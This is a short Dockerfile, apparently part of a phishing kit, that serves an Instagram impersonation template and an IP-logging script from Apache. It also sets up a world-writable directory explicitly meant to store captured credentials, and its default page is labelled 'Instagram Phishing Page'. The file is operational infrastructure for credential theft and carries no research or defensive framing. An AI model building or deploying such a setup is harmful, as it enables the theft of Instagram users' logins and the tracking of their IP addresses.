# Use PHP with Apache
FROM php:apache

# Copy your Instagram template to the web root
COPY .sites/instagram /var/www/html/
COPY .sites/ip.php /var/www/html/

# Create auth directory for credentials
RUN mkdir -p /var/www/html/auth && chmod 777 /var/www/html/auth

# Fix permissions for all files
RUN chown -R www-data:www-data /var/www/html/ && \
    chmod -R 755 /var/www/html/ && \
    chmod -R 777 /var/www/html/auth

# Enable Apache modules
RUN a2enmod rewrite

# Create a default index if missing
RUN if [ ! -f /var/www/html/index.php ]; then \
        echo '<?php echo "Instagram Phishing Page"; ?>' > /var/www/html/index.php; \
    fi

EXPOSE 80

# Start Apache
CMD ["apache2-foreground"]
